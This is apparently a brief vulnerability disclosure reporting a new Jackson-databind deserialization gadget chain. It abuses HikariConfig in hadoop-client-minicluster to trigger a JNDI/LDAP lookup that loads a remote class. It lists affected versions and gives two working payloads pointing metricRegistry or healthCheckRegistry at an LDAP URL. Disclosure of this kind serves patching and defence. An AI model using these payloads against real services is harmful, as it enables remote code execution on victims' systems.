hello，We're threedr3am and LFY.I found a new jackson rce gadget chain again.

---

Principle: When org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig is deserialized, by specifying the value corresponding to the json key of metricRegistry or healthCheckRegistry as the ldap service, the ldap service can refer to the malicious class, thereby triggering its setMetricRegistry or setHealthCheckRegistry method during deserialization. A chain that finally triggers InitialContext.lookup to the malicious class of the ldap service, thereby loading the remote class to local execution and achieving remote code execution RCE.

1、pom.xml

```
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.10.3</version>
</dependency>
<dependency>
      <groupId>org.apache.hadoop</groupId>
      <artifactId>hadoop-client-minicluster</artifactId>
      <version>3.2.1</version>
</dependency>
```

2、payload：

```
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();

String json = "[\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"ldap://localhost:43658/Calc\"}]";
mapper.readValue(json, Object.class);
```
or
```
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();

String json = "[\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\", {\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}]";
mapper.readValue(json, Object.class);
```
